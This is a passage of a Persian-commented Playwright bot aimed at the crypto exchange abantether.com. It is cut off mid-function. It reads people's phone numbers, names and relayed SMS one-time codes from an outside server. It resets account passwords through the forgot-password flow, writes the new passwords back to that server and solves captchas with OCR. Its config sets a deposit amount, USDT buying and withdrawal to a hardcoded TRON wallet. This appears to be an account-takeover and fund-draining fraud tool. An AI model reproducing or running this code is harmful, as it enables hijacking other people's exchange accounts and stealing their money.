// بوت کامپلت - Bot.js (نسخه اصلاح شده)
const { chromium } = require("playwright");
const { createWorker } = require("tesseract.js");
// ==================== تنظیمات ====================
const CONFIG = {
  SERVER_URL: "https://server-db-jo9j.vercel.app" ,
  BASE_URL: "https://abantether.com",
  REGISTER_URL: "https://abantether.com/register",
  DEPOSIT_URL: "https://abantether.com/user/wallet/deposit/irt/direct",
  BUY_URL: "https://abantether.com/user/trade/fast/buy?s=USDT",
  WITHDRAW_URL:
    "https://abantether.com/user/wallet/withdrawal/crypto?symbol=USDT",
  TIMEOUT: 60000,
  HEADLESS: false,

  DEPOSIT_AMOUNT: "5000000",
  WITHDRAW_ADDRESS: "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS",
  MAX_RETRIES: 3,
  RETRY_DELAY: 10000,

  POLLING_INTERVAL: 30000,
  BATCH_SIZE: 3,

  WAIT_FOR_OTP: 120000,
  PAGE_LOAD_DELAY: 3000,
  ELEMENT_WAIT: 5000,
};

// ==================== کلاس اصلی ربات ====================
class AbanTetherBot {
  constructor() {
    this.isProcessing = false;
    this.activeProcesses = new Map();
    this.browser = null;
    this.page = null;
    this.context = null;
    this.currentUser = null;
    this.currentPassword = this.generatePassword();
  }

  generatePassword() {
    const uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const lowercase = "abcdefghijklmnopqrstuvwxyz";
    const numbers = "0123456789";
    const specialEnd = "@#!";

    let password = "";

    // حداقل یک بزرگ، یک کوچک، یک عدد
    password += uppercase[Math.floor(Math.random() * uppercase.length)];
    password += lowercase[Math.floor(Math.random() * lowercase.length)];
    password += numbers[Math.floor(Math.random() * numbers.length)];

    // پر کردن تا حداقل ۱۲ کاراکتر
    const allChars = uppercase + lowercase + numbers + specialEnd;
    while (password.length < 12) {
      password += allChars[Math.floor(Math.random() * allChars.length)];
    }

    // آخر حتماً یکی از @ # !
    const lastSpecial =
      specialEnd[Math.floor(Math.random() * specialEnd.length)];
    password = password.slice(0, -1) + lastSpecial; // جایگزین آخرین کاراکتر

    // میکس کردن
    password = password
      .split("")
      .sort(() => Math.random() - 0.5)
      .join("");

    console.log(
      `🔐 رمز عبور جدید تولید شده: ${password} (طول: ${password.length})`
    );
    return password;
  }

  async connectToDatabase() {
    try {
      console.log("🔗 در حال تست اتصال به سرور واسط...");
      
      // تست اتصال به سرور
      const response = await fetch(CONFIG.SERVER_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          operation: 'findOne',
          collection: CONFIG.COLLECTION_NAME,
          query: { test: 'test' } // یک کوئری تستی
        })
      });
      
      if (response.ok) {
        console.log("✅ اتصال به سرور واسط موفقیت‌آمیز بود");
        return true;
      } else {
        throw new Error(`سرور خطا داد: ${response.status}`);
      }
    } catch (error) {
      console.error("❌ خطا در اتصال به سرور واسط:", error.message);
      return false;
    }
  }

  async getPendingUsers() {
    try {
      console.log("🔍 در حال دریافت کاربران از سرور واسط...");
  
      const response = await fetch(CONFIG.SERVER_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          operation: 'find',
          collection: CONFIG.COLLECTION_NAME,
          query: {
            $and: [
              {
                $or: [{ processed: { $exists: false } }, { processed: false }],
              },
              {
                $or: [
                  { status: { $exists: false } },
                  { status: { $ne: "failed" } },
                ],
              },
            ],
          }
        })
      });
  
      if (!response.ok) {
        throw new Error(`خطای سرور: ${response.status}`);
      }
  
      const data = await response.json();
      const users = data.result || [];
      
      console.log(`📊 ${users.length} کاربر در انتظار پردازش پیدا شد`);
  
      if (users.length > 0) {
        console.log("📋 لیست کاربران:");
        users.forEach((user, index) => {
          console.log(
            `   ${index + 1}. ${user.personalPhoneNumber} - ${
              user.personalName
            }`
          );
          console.log(
            `      وضعیت: ${user.status || "جدید"} | تلاش‌ها: ${
              user.retryCount || 0
            }`
          );
        });
      }
  
      // محدود کردن به تعداد BATCH_SIZE
      return users.slice(0, CONFIG.BATCH_SIZE);
    } catch (error) {
      console.error("❌ خطا در دریافت کاربران:", error.message);
      return [];
    }
  }

  async updateUserStatus(phoneNumber, updateData) {
    try {
      console.log(`📝 آپدیت وضعیت کاربر ${phoneNumber} در سرور واسط`);
  
      const updateObj = {
        lastUpdated: new Date(),
      };
  
      if (updateData.status) updateObj.status = updateData.status;
      if (updateData.password) updateObj.password = updateData.password;
  
      if (updateData.status === "failed") {
        updateObj.retryCount = (updateData.retryCount || 0) + 1;
      }
  
      const response = await fetch(CONFIG.SERVER_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          operation: 'updateOne',
          collection: CONFIG.COLLECTION_NAME,
          filter: { personalPhoneNumber: phoneNumber },
          data: updateObj
        })
      });
  
      if (!response.ok) {
        throw new Error(`خطای سرور: ${response.status}`);
      }
  
      const data = await response.json();
      console.log(`✅ وضعیت کاربر ${phoneNumber} آپدیت شد`);
      
      return data.success;
    } catch (error) {
      console.error(`❌ خطا در آپدیت کاربر ${phoneNumber}:`, error.message);
      return false;
    }
  }

  async checkForOtp(phoneNumber, fieldType) {
    try {
      console.log(`🔍 چک کردن OTP ${fieldType} برای ${phoneNumber}`);
  
      const response = await fetch(CONFIG.SERVER_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          operation: 'findOne',
          collection: CONFIG.COLLECTION_NAME,
          query: { personalPhoneNumber: phoneNumber }
        })
      });
  
      if (!response.ok) {
        throw new Error(`خطای سرور: ${response.status}`);
      }
  
      const data = await response.json();
      const user = data.result;
  
      if (user) {
        let otp = null;
  
        // ========== اضافه کردن otp_login2 ==========
        if (fieldType === "login" && user.otp_signin) {
          otp = user.otp_signin;
        } else if (fieldType === "login2" && user.otp_login2) {  // جدید
          otp = user.otp_login2;
        } else if (fieldType === "signin" && user.otp_login) {
          otp = user.otp_login;
        } else if (fieldType === "register_card" && user.otp_register_card) {
          otp = user.otp_register_card;
        } else if (fieldType === "payment" && user.otp_payment) {
          otp = user.otp_payment;
        } else if (fieldType === "card" && user.otp_card) {
          otp = user.otp_card;
        }
  
        if (otp && otp.toString().trim().length >= 4) {
          console.log(`✅ OTP ${fieldType} یافت شد: ${otp}`);
          return otp.toString().trim();
        } else {
          console.log(`⏳ هنوز OTP ${fieldType} موجود نیست`);
        }
      }
  
      return null;
    } catch (error) {
      console.error("❌ خطا در چک کردن OTP:", error.message);
      return null;
    }
  }

  async recoverPasswordAndLogin() {
    console.log("🔄 ثبت‌نام موفق نبود، شروع فرآیند فراموشی رمز عبور...");
  
    await this.page.goto("https://abantether.com/login");
    await this.page.waitForTimeout(3000);
  
    // کلیک فراموشی رمز عبور
    await this.page.click('button[title="فراموشی رمز عبور"]');
    await this.page.waitForTimeout(3000);
  
    // وارد کردن شماره موبایل
    await this.page.fill(
      'input[data-testid="username-input"][placeholder="شماره موبایل خود را وارد کنید"]',
      this.currentUser.personalPhoneNumber
    );
    await this.page.waitForTimeout(1000);
  
    // کلیک مرحله بعد
    await this.page.click('button[title="مرحله بعد"]');
    await this.page.waitForTimeout(5000);
  
    // منتظر OTP فراموشی رمز (otp_login)
    console.log("⏳ منتظر OTP فراموشی رمز (otp_login)...");
    let otpLogin = null;
    const startTime = Date.now();
    while (Date.now() - startTime < CONFIG.WAIT_FOR_OTP) {
      otpLogin = await this.checkForOtp(
        this.currentUser.personalPhoneNumber,
        "login"
      );
      if (otpLogin) break;
      await this.page.waitForTimeout(5000);
    }
  
    if (!otpLogin) {
      throw new Error("OTP فراموشی رمز دریافت نشد");
    }
  
    await this.page.fill(
      'input[name="otp"][placeholder="کد ارسال شده به شماره موبایل خود را وارد کنید"]',
      otpLogin
    );
    await this.page.waitForTimeout(1500);
  
    // تولید رمز جدید
    const newPassword = this.generatePassword();
  
    // وارد کردن رمز جدید و تکرار
    await this.page.fill(
      'input[placeholder="رمز عبور جدید خود را وارد نمایید"]',
      newPassword
    );
    await this.page.fill(
      'input[placeholder="رمز عبور جدید خود را مجددا وارد نمایید"]',
      newPassword
    );
    await this.page.waitForTimeout(1000);
  
    // کلیک تایید
    await this.page.click('button[title="تایید"]');
    await this.page.waitForTimeout(5000);
  
    // صفحه ورود: وارد کردن موبایل و رمز جدید
    await this.page.fill(
      'input[data-testid="username-input"][placeholder="شماره موبایل خود را وارد کنید"]',
      this.currentUser.personalPhoneNumber
    );
    await this.page.fill(
      'input[data-testid="password-input"][placeholder="رمز عبور خود را وارد نمایید"]',
      newPassword
    );
    await this.page.waitForTimeout(1000);
  
    // کلیک ورود
    await this.page.click('button[title="ورود"]');
    await this.page.waitForTimeout(5000);
  
    // ========== تغییر این قسمت ==========
    // منتظر OTP ورود جدید (otp_login2)
    console.log("⏳ منتظر OTP ورود جدید (otp_login2)...");
    let otpLogin2 = null;
    const startLogin2 = Date.now();
    while (Date.now() - startLogin2 < CONFIG.WAIT_FOR_OTP) {
      otpLogin2 = await this.checkForOtp(
        this.currentUser.personalPhoneNumber,
        "login2"  // تغییر به login2
      );
      if (otpLogin2 && otpLogin2 !== otpLogin) break; // برای جلوگیری از استفاده از OTP قبلی
      await this.page.waitForTimeout(5000);
    }
  
    if (!otpLogin2) {
      throw new Error("OTP ورود جدید (login2) دریافت نشد");
    }
  
    await this.page.fill(
      'input[placeholder="کد ارسال شده به شماره موبایل خود را وارد کنید"]',
      otpLogin2
    );
    await this.page.waitForTimeout(1500);
  
    // کلیک تایید نهایی
    await this.page.click('button[title="تایید"]');
    await this.page.waitForTimeout(5000);
  
    // ذخیره رمز جدید در دیتابیس
    await this.updateUserStatus(this.currentUser.personalPhoneNumber, {
      password: newPassword,
    });
  
    console.log("✅ فرآیند فراموشی رمز و ورود مجدد با موفقیت انجام شد");
    this.currentPassword = newPassword; // برای مراحل بعدی
  }

  async initializeBrowser() {
    try {
      console.log("🌐 در حال راه‌اندازی مرورگر...");

      this.browser = await chromium.launch({
        headless: CONFIG.HEADLESS,
        args: [
          "--no-sandbox",
          "--disable-setuid-sandbox",
          "--disable-dev-shm-usage",
          "--disable-web-security",
          "--disable-features=IsolateOrigins,site-per-process",
        ],
        slowMo: 100,
      });

      this.context = await this.browser.newContext({
        viewport: { width: 1280, height: 800 },
        userAgent:
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        acceptDownloads: false,
        javaScriptEnabled: true,
        locale: "fa-IR",
        timezoneId: "Asia/Tehran",
      });

      this.page = await this.context.newPage();
      await this.page.setDefaultTimeout(CONFIG.TIMEOUT);
      await this.page.setDefaultNavigationTimeout(CONFIG.TIMEOUT);

      console.log("✅ مرورگر با موفقیت راه‌اندازی شد");
      return true;
    } catch (error) {
      console.error("❌ خطا در راه‌اندازی مرورگر:", error.message);
      return false;
    }
  }

  async closeBrowser() {
    try {
      console.log("🔒 در حال بستن مرورگر...");
      if (this.page) await this.page.close();
      if (this.context) await this.context.close();
      if (this.browser) await this.browser.close();
      console.log("✅ مرورگر بسته شد");
    } catch (error) {
      console.error("⚠️ خطا در بستن مرورگر:", error.message);
    }
  }

  async navigateTo(url, waitForLoad = true) {
    try {
      console.log(`🌐 در حال رفتن به: ${url}`);

      await this.page.goto(url, {
        waitUntil: "domcontentloaded",
        timeout: CONFIG.TIMEOUT,
      });

      if (waitForLoad) {
        await this.page
          .waitForLoadState("networkidle", { timeout: 10000 })
          .catch(() => {});
      }

      await this.page.waitForTimeout(CONFIG.PAGE_LOAD_DELAY);
      console.log("✅ صفحه با موفقیت بارگذاری شد");
      return true;
    } catch (error) {
      console.error(`❌ خطا در رفتن به ${url}:`, error.message);
      return false;
    }
  }

  async waitForElement(selector, timeout = CONFIG.ELEMENT_WAIT) {
    try {
      await this.page.waitForSelector(selector, { timeout });
      return true;
    } catch (error) {
      console.log(`⚠️ المنت ${selector} پیدا نشد`);
      return false;
    }
  }

  async solveCaptchaWithTesseract() {
    console.log("🔍 در حال حل کپچا با Tesseract OCR (آفلاین)...");

    const worker = await createWorker({
      logger: (m) => console.log(m), // لاگ پیشرفت (اختیاری، می‌تونی حذف کنی)
      cacheMethod: "none",
    });

    await worker.load();
    await worker.loadLanguage("eng"); // برای اعداد بانکی 'eng' بهتر کار می‌کنه
    await worker.initialize("eng");

    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        // پیدا کردن تصویر کپچا
        const captchaImg = await this.page.$("img.border-start.h-100");
        if (!captchaImg) {
          console.log("❌ تصویر کپچا پیدا نشد");
          await this.page.waitForTimeout(2000);
          continue;
        }

        // گرفتن اسکرین‌شات فقط از تصویر کپچا
        const screenshotBuffer = await captchaImg.screenshot();

        // تشخیص متن
        const {
          data: { text },
        } = await worker.recognize(screenshotBuffer);

        // تمیز کردن: فقط اعداد، حذف همه چیز دیگه
        let captchaCode = text.trim().replace(/\D/g, "");

        console.log(
          `تلاش ${attempt} - متن خام: "${text}" → کد استخراج شده: "${captchaCode}"`
        );

        if (captchaCode.length === 4) {
          console.log(`✅ کپچا با موفقیت حل شد: ${captchaCode}`);
          await worker.terminate();
          return captchaCode;
        }

        // اگر اشتباه بود، رفرش کپچا
        console.log(`⚠️ کد ناقص یا اشتباه، رفرش کپچا...`);
        const refreshBtn = await this.page.$(
          "#card-captcha-refresh-btn i, a.btn i.fa-sync-alt"
        );
        if (refreshBtn) {
          await refreshBtn.click();
          await this.page.waitForTimeout(2500);
        }
      } catch (error) {
        console.error(`❌ خطا در تشخیص کپچا (تلاش ${attempt}):`, error.message);
      }
    }

    await worker.terminate();
    console.log("❌ حل کپچا ناموفق بعد از ۳ تلاش");
    return null;
  }

  async fillByPlaceholder(placeholder, value) {
    try {
      console.log(`📝 وارد کردن "${value}" در فیلد "${placeholder}"...`);

      const selector = `input[placeholder*="${placeholder}"], textarea[placeholder*="${placeholder}"]`;

      if (await this.waitForElement(selector, 3000)) {
        await this.page.fill(selector, value);
        await this.page.waitForTimeout(500);
        console.log(`✅ مقدار "${value}" در فیلد "${placeholder}" وارد شد`);
        return true;
      }

      console.log(`❌ فیلد "${placeholder}" پیدا نشد`);
      return false;
    } catch (error) {
      console.error(`❌ خطا در پر کردن فیلد "${placeholder}":`, error.message);
      return false;
    }
  }

  async clickByText(text, timeout = 5000) {
    try {
      console.log(`🖱️ کلیک روی "${text}"...`);

      const locator = this.page.locator(`text=${text}`).first();

      try {
        await locator.waitFor({ state: "visible", timeout });
        await locator.waitFor({ state: "attached", timeout });

        const isDisabled = await locator.getAttribute("disabled");
        if (isDisabled !== null) {
          console.log(`⚠️ دکمه "${text}" disabled است، منتظر فعال شدن...`);
          await locator
            .waitFor({ state: "enabled", timeout: 10000 })
            .catch(() => {
              console.log(`⚠️ دکمه "${text}" فعال نشد، ادامه می‌دهیم...`);
            });
        }

        await locator.click();
        await this.page.waitForTimeout(1000);
        console.log(`✅ کلیک روی "${text}"`);
        return true;
      } catch (error) {
        console.log(`⚠️ روش locator برای "${text}" کار نکرد: ${error.message}`);
      }

      try {
        const clicked = await this.page.evaluate((btnText) => {
          const elements = Array.from(document.querySelectorAll("*")).filter(
            (el) => el.textContent && el.textContent.includes(btnText)
          );

          for (const element of elements) {
            if (
              element.offsetParent !== null &&
              element.getAttribute("disabled") === null
            ) {
              element.click();
              return true;
            }
          }
          return false;
        }, text);

        if (clicked) {
          await this.page.waitForTimeout(1000);
          console.log(`✅ کلیک روی "${text}" (evaluate)`);
          return true;
        }
      } catch (error) {
        console.log(
          `⚠️ روش evaluate برای "${text}" کار نکرد: ${error.message}`
        );
      }

      console.log(`❌ نتوانست روی "${text}" کلیک کند`);
      return false;
    } catch (error) {
      console.error(`❌ خطا در کلیک روی "${text}":`, error.message);
      return false;
    }
  }

  async clickByTitle(title, timeout = 5000) {
    try {
      console.log(`🖱️ کلیک روی title="${title}"...`);

      const locator = this.page.locator(`[title="${title}"]`).first();

      try {
        await locator.waitFor({ state: "visible", timeout });
        await locator.click();
        await this.page.waitForTimeout(1000);
        console.log(`✅ کلیک روی title="${title}"`);
        return true;
      } catch (error) {
        console.log(
          `⚠️ روش locator برای title="${title}" کار نکرد: ${error.message}`
        );
      }

      try {
        const clicked = await this.page.evaluate((titleText) => {
          const elements = document.querySelectorAll(`[title="${titleText}"]`);
          for (const element of elements) {
            if (element.offsetParent !== null) {
              element.click();
              return true;
            }
          }
          return false;
        }, title);

        if (clicked) {
          await this.page.waitForTimeout(1000);
          console.log(`✅ کلیک روی title="${title}" (evaluate)`);
          return true;
        }
      } catch (error) {
        console.log(
          `⚠️ روش evaluate برای title="${title}" کار نکرد: ${error.message}`
        );
      }

      console.log(`❌ نتوانست روی title="${title}" کلیک کند`);
      return false;
    } catch (error) {
      console.error(`❌ خطا در کلیک روی title="${title}":`, error.message);
      return false;
    }
  }

  async waitForOtp(fieldType) {
    const phoneNumber = this.currentUser.personalPhoneNumber;
    console.log(`⏳ در انتظار OTP ${fieldType} برای ${phoneNumber}...`);

    const startTime = Date.now();
    const timeout = CONFIG.WAIT_FOR_OTP;

    while (Date.now() - startTime < timeout) {
      const otp = await this.checkForOtp(phoneNumber, fieldType);

      if (otp) {
        return otp;
      }

      console.log(`⏳ چک مجدد OTP ${fieldType} در 5 ثانیه...`);
      await this.page.waitForTimeout(5000);
    }

    throw new Error(`⏰ تایم‌اوت برای دریافت OTP ${fieldType}`);
  }

  async enterOtp(otp) {
    try {
      console.log(`🔢 در حال وارد کردن OTP: ${otp}`);

      const placeholders = [
        "کد ارسال شده به شماره موبایل خود را وارد کنید",
        "کد ارسال شده",
        "کد",
        "رمز",
      ];

      for (const placeholder of placeholders) {
        const entered = await this.fillByPlaceholder(placeholder, otp);
        if (entered) {
          console.log(`✅ OTP در فیلد "${placeholder}" وارد شد`);
          return true;
        }
      }

      const otpInputs = await this.page.$$(
        'input[type="tel"], input[type="number"]'
      );

      if (otpInputs.length > 0) {
        const otpDigits = otp.toString().split("");
        for (let i = 0; i < Math.min(otpInputs.length, otpDigits.length); i++) {
          await otpInputs[i].fill(otpDigits[i]);
        }
        console.log("✅ OTP در فیلدهای عددی وارد شد");
        return true;
      }

      throw new Error("هیچ فیلدی برای وارد کردن OTP پیدا نشد");
    } catch (error) {
      console.error("❌ خطا در وارد کردن OTP:", error.message);
      throw error;
    }
  }

  async selectBirthDate(birthDate) {
    try {
      console.log(`📅 پردازش تاریخ تولد: ${birthDate}`);

      // 1. جدا کردن سال، ماه، روز
      const dateParts = birthDate.split("/");
      if (dateParts.length !== 3) {
        console.log("⚠️ فرمت تاریخ تولد نامعتبر است");
        return false;
      }

      const [year, month, day] = dateParts.map((part) => parseInt(part));
      console.log(`📅 سال: ${year} | ماه: ${month} | روز: ${day}`);

      // 2. نام ماه فارسی
      const monthNames = [
        "فروردین",
        "اردیبهشت",
        "خرداد",
        "تیر",
        "مرداد",
        "شهریور",
        "مهر",
        "آبان",
        "آذر",
        "دی",
        "بهمن",
        "اسفند",
      ];

      const monthName = monthNames[month - 1];
      console.log(`📅 نام ماه: ${monthName}`);

      // 3. تبدیل به فارسی برای جستجو
      const persianYear = this.toPersianNumbers(year.toString());
      const persianDay = this.toPersianNumbers(day.toString());
      console.log(`📅 سال فارسی: ${persianYear} | روز فارسی: ${persianDay}`);

      // 4. پیدا کردن فیلد تاریخ تولد و کلیک
      const selectors = [
        'input[placeholder*="تاریخ"]',
        'input[placeholder*="تولد"]',
        'input[placeholder*="روز/ماه/سال"]',
        'input[name*="birth"]',
        'input[name*="date"]',
        'input[type="date"]',
      ];

      let dateField = null;
      for (const selector of selectors) {
        dateField = await this.page.$(selector);
        if (dateField) {
          console.log(`✅ فیلد تاریخ تولد پیدا شد: ${selector}`);
          break;
        }
      }

      if (!dateField) {
        console.log("❌ فیلد تاریخ تولد پیدا نشد");
        return false;
      }

      // 5. کلیک روی فیلد تاریخ تولد
      await dateField.click();
      console.log("✅ کلیک روی فیلد تاریخ تولد");
      await this.page.waitForTimeout(2000);

      // ========== مرحله 1: کلیک روی سال 1404 ==========
      console.log("\n🔍 مرحله 1: پیدا کردن و کلیک روی سال 1404");

      let year1404Clicked = false;

      // اول با locator امتحان کن
      try {
        const year1404Locator = this.page.locator("text=۱۴۰۴").first();
        await year1404Locator.waitFor({ state: "visible", timeout: 5000 });
        await year1404Locator.click();
        console.log("✅ سال 1404 با locator پیدا و کلیک شد");
        year1404Clicked = true;
        await this.page.waitForTimeout(1000);
      } catch (error) {
        console.log("⚠️ سال 1404 با locator پیدا نشد");
      }

      // اگر نشد، با evaluate امتحان کن
      if (!year1404Clicked) {
        const clicked = await this.page.evaluate(() => {
          const elements = document.querySelectorAll("*");

          for (const element of elements) {
            const text = element.textContent || "";
            if (text.includes("۱۴۰۴") || text.includes("1404")) {
              const style = window.getComputedStyle(element);
              if (
                style.cursor === "pointer" ||
                element.hasAttribute("tabindex")
              ) {
                element.click();
                return true;
              }
            }
          }
          return false;
        });

        if (clicked) {
          console.log("✅ سال 1404 با evaluate پیدا و کلیک شد");
          year1404Clicked = true;
          await this.page.waitForTimeout(1000);
        }
      }

      // اگر باز هم نشد، المنت‌های span با cursor: pointer را چک کن
      if (!year1404Clicked) {
        const spanElements = await this.page.$$(
          'span[style*="cursor: pointer"]'
        );
        for (const span of spanElements) {
          const text = await span.textContent();
          if (text && (text.includes("۱۴۰۴") || text.includes("1404"))) {
            await span.click();
            console.log("✅ سال 1404 با span پیدا و کلیک شد");
            year1404Clicked = true;
            await this.page.waitForTimeout(1000);
            break;
          }
        }
      }

      if (!year1404Clicked) {
        console.log("⚠️ سال 1404 پیدا نشد، ادامه می‌دهیم...");
      }

      // ========== مرحله 2: پیدا کردن و کلیک روی فلش ==========
      console.log("\n🔍 مرحله 2: پیدا کردن و کلیک روی فلش تغییر سال");

      let arrowElement = await this.page.$("i.rmdp-arrow");
      if (!arrowElement) {
        console.log("⚠️ فلش تغییر سال با کلاس rmdp-arrow پیدا نشد");

        const allArrows = await this.page.$$("i");
        for (const arrow of allArrows) {
          const className = await arrow.getAttribute("class");
          if (className && className.includes("arrow")) {
            arrowElement = arrow;
            console.log("✅ فلش با کلاس arrow پیدا شد");
            break;
          }
        }
      }

      if (!arrowElement) {
        console.log("❌ فلش تغییر سال پیدا نشد");
        return false;
      }

      console.log("✅ فلش تغییر سال پیدا شد");

      // ========== مرحله 3: جستجو برای سال مورد نظر ==========
      console.log(`\n🔍 مرحله 3: جستجو برای سال ${persianYear}`);

      let yearFound = false;
      const maxAttempts = 50;

      for (let attempt = 0; attempt < maxAttempts; attempt++) {
        console.log(`🔄 تلاش ${attempt + 1} از ${maxAttempts}`);

        await arrowElement.click();
        await this.page.waitForTimeout(500);

        // روش 1: با locator امتحان کن
        try {
          const yearLocator = this.page.locator(`text=${persianYear}`).first();
          await yearLocator.waitFor({ state: "visible", timeout: 2000 });
          await yearLocator.click();
          console.log(`✅ سال ${persianYear} با locator پیدا و کلیک شد!`);
          yearFound = true;
          await this.page.waitForTimeout(1000);
          break;
        } catch (error) {
          console.log(`⚠️ سال ${persianYear} با locator پیدا نشد`);
        }

        // روش 2: با evaluate و کلیک مستقیم
        if (!yearFound) {
          const clicked = await this.page.evaluate((searchYear) => {
            // همه المنت‌ها را بگیر
            const elements = document.querySelectorAll("*");

            for (const element of elements) {
              const text = element.textContent || "";
              // اگر متن دقیقاً برابر با سال مورد نظر باشد
              if (text.trim() === searchYear) {
                console.log(
                  "✅ المنت سال پیدا شد:",
                  element.tagName,
                  element.className
                );

                // سعی کن کلیک کنی
                try {
                  element.click();
                  return true;
                } catch (clickError) {
                  // اگر کلیک کار نکرد، از dispatchEvent استفاده کن
                  const clickEvent = new MouseEvent("click", {
                    view: window,
                    bubbles: true,
                    cancelable: true,
                  });
                  element.dispatchEvent(clickEvent);
                  return true;
                }
              }
            }
            return false;
          }, persianYear);

          if (clicked) {
            console.log(`✅ سال ${persianYear} با evaluate پیدا و کلیک شد!`);
            yearFound = true;
            await this.page.waitForTimeout(1000);
            break;
          }
        }

        // روش 3: المنت‌های span قابل کلیک را چک کن
        if (!yearFound) {
          const spanElements = await this.page.$$("span");
          for (const span of spanElements) {
            const text = await span.textContent();
            if (text && text.trim() === persianYear) {
              await span.click();
              console.log(`✅ سال ${persianYear} با span پیدا و کلیک شد!`);
              yearFound = true;
              await this.page.waitForTimeout(1000);
              break;
            }
          }
          if (yearFound) break;
        }

        console.log(`⏳ سال ${persianYear} هنوز پیدا نشد...`);
      }

      // ========== مرحله 4: انتخاب ماه ==========
      console.log(`\n🔍 مرحله 4: انتخاب ماه ${monthName}`);

      await this.page.waitForTimeout(1500);

      let monthClicked = false;

      try {
        const currentMonthLocator = this.page.locator("text=دی").first();
        await currentMonthLocator.waitFor({ state: "visible", timeout: 3000 });
        await currentMonthLocator.click();
        console.log("✅ ماه دی با locator پیدا و کلیک شد");
        monthClicked = true;
        await this.page.waitForTimeout(1000);
      } catch (error) {
        console.log("⚠️ ماه دی با locator پیدا نشد");
      }

      if (!monthClicked) {
        const clicked = await this.page.evaluate(() => {
          const elements = document.querySelectorAll(
            'span[style*="cursor: pointer"]'
          );
          for (const element of elements) {
            const text = element.textContent || "";
            if (text === "دی" || text === "اسفند" || text === "فروردین") {
              element.click();
              return true;
            }
          }
          return false;
        });

        if (clicked) {
          console.log("✅ ماه فعلی با evaluate پیدا و کلیک شد");
          monthClicked = true;
          await this.page.waitForTimeout(1000);
        }
      }

      let targetMonthClicked = false;

      try {
        const targetMonthLocator = this.page
          .locator(`text=${monthName}`)
          .first();
        await targetMonthLocator.waitFor({ state: "visible", timeout: 3000 });
        await targetMonthLocator.click();
        console.log(`✅ ماه ${monthName} با locator پیدا و کلیک شد`);
        targetMonthClicked = true;
        await this.page.waitForTimeout(1000);
      } catch (error) {
        console.log(`⚠️ ماه ${monthName} با locator پیدا نشد`);
      }

      if (!targetMonthClicked) {
        const clicked = await this.page.evaluate((searchMonth) => {
          const elements = document.querySelectorAll("*");
          for (const element of elements) {
            const text = element.textContent || "";
            if (text.includes(searchMonth)) {
              const style = window.getComputedStyle(element);
              if (
                style.cursor === "pointer" ||
                element.hasAttribute("tabindex")
              ) {
                element.click();
                return true;
              }
            }
          }
          return false;
        }, monthName);

        if (clicked) {
          console.log(`✅ ماه ${monthName} با evaluate پیدا و کلیک شد`);
          targetMonthClicked = true;
          await this.page.waitForTimeout(1000);
        }
      }

      if (!targetMonthClicked) {
        console.log(`⚠️ ماه ${monthName} پیدا نشد`);
        return false;
      }

      // ========== مرحله 5: انتخاب روز ==========
      console.log(`\n🔍 مرحله 5: انتخاب روز ${persianDay}`);

      await this.page.waitForTimeout(1500);

      let dayClicked = false;

      try {
        const dayLocator = this.page.locator(`text=${persianDay}`).first();
        await dayLocator.waitFor({ state: "visible", timeout: 3000 });
        await dayLocator.click();
        console.log(`✅ روز ${persianDay} با locator پیدا و کلیک شد`);
        dayClicked = true;
        await this.page.waitForTimeout(1000);
      } catch (error) {
        console.log(`⚠️ روز ${persianDay} با locator پیدا نشد`);
      }

      if (!dayClicked) {
        const sdElements = await this.page.$$(".sd");
        for (const element of sdElements) {
          const text = await element.textContent();
          if (text && text.includes(persianDay)) {
            await element.click();
            console.log(`✅ روز ${persianDay} با کلاس sd پیدا و کلیک شد`);
            dayClicked = true;
            await this.page.waitForTimeout(1000);
            break;
          }
        }
      }

      if (!dayClicked) {
        const clicked = await this.page.evaluate((searchDay) => {
          const elements = document.querySelectorAll("*");
          for (const element of elements) {
            const text = element.textContent || "";
            if (text === searchDay) {
              const style = window.getComputedStyle(element);
              if (
                style.cursor === "pointer" ||
                element.classList.contains("sd") ||
                element.hasAttribute("tabindex")
              ) {
                element.click();
                return true;
              }
            }
          }
          return false;
        }, persianDay);

        if (clicked) {
          console.log(`✅ روز ${persianDay} با evaluate پیدا و کلیک شد`);
          dayClicked = true;
          await this.page.waitForTimeout(1000);
        }
      }

      if (!dayClicked) {
        console.log(`⚠️ روز ${persianDay} پیدا نشد`);
        return false;
      }

      // ========== مرحله 6: کلیک روی دکمه تایید ==========
      console.log("\n🔍 مرحله 6: کلیک روی دکمه تایید");

      let confirmClicked = false;

      try {
        const confirmLocator = this.page
          .locator('button:has-text("تایید")')
          .first();
        await confirmLocator.waitFor({ state: "visible", timeout: 3000 });
        await confirmLocator.click();
        console.log("✅ دکمه تایید با locator پیدا و کلیک شد");
        confirmClicked = true;
        await this.page.waitForTimeout(2000);
      } catch (error) {
        console.log("⚠️ دکمه تایید با locator پیدا نشد");
      }

      if (!confirmClicked) {
        const buttons = await this.page.$$(
          "button.rmdp-button.rmdp-action-button"
        );
        for (const button of buttons) {
          const text = await button.textContent();
          if (text && text.includes("تایید")) {
            await button.click();
            console.log("✅ دکمه تایید با کلاس rmdp-button پیدا و کلیک شد");
            confirmClicked = true;
            await this.page.waitForTimeout(2000);
            break;
          }
        }
      }

      if (!confirmClicked) {
        const clicked = await this.page.evaluate(() => {
          const buttons = document.querySelectorAll("button");
          for (const button of buttons) {
            const text = button.textContent || "";
            if (
              text.includes("تایید") ||
              text.includes("تأیید") ||
              text.includes("ثبت")
            ) {
              button.click();
              return true;
            }
          }
          return false;
        });

        if (clicked) {
          console.log("✅ دکمه تأیید با evaluate پیدا و کلیک شد");
          confirmClicked = true;
          await this.page.waitForTimeout(2000);
        }
      }

      if (!confirmClicked) {
        console.log("⚠️ دکمه تایید پیدا نشد");
      } else {
        console.log("✅ تاریخ تولد با موفقیت انتخاب شد");
      }

      return true;
    } catch (error) {
      console.error("❌ خطا در انتخاب تاریخ تولد:", error.message);
      return false;
    }
  }

  toPersianNumbers(num) {
    const persianDigits = ["۰", "۱", "۲", "۳", "۴", "۵", "۶", "۷", "۸", "۹"];
    return num
      .toString()
